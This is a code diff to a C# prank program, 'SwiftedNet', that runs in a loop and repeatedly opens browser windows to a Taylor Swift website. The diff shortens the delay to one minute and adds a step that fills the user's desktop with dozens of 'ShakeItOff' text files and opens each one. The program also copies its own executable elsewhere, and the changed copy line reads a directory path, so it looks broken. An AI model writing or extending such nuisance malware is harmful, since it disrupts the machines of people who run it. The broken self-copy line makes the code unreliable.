@@ -15,7 +15,11 @@ namespace SwiftedNet
         private const string url = "https://www.taylorswift.com";
         private const int MIN_BROWSERS = 1;
         private const int MAX_BROWSERS = 20;
-        private const int DELAY_MINUTES = 5;
+
+        private const int MIN_TEXTFILES = 5;
+        private const int MAX_TEXTFILES = 50;
+
+        private const int DELAY_MINUTES = 1;
 
         private const string RESOURCE_NAME = "bg.jpg";
 
@@ -62,7 +66,7 @@ namespace SwiftedNet
         {
             try
             {
-                var fileBytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
+                var fileBytes = File.ReadAllBytes(AppContext.BaseDirectory);
 
                 File.WriteAllBytes(path, fileBytes);
             }
@@ -126,6 +130,17 @@ namespace SwiftedNet
                 for (var x = 0; x < numInstances; x++)
                 {
                     OpenBrowser(url);
+                }
+
+                numInstances = rand.Next(MIN_TEXTFILES, MAX_TEXTFILES);
+
+                for (var x = 0; x < numInstances; x++)
+                {
+                    var textFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), $"ShakeItOff_{DateTime.Now.Ticks}.txt");
+
+                    File.WriteAllText(textFile, $"Look what you made me do on {DateTime.Now}");
+
+                    OpenBrowser(textFile);
                 }
 
                 Thread.Sleep(TimeSpan.FromMinutes(DELAY_MINUTES));
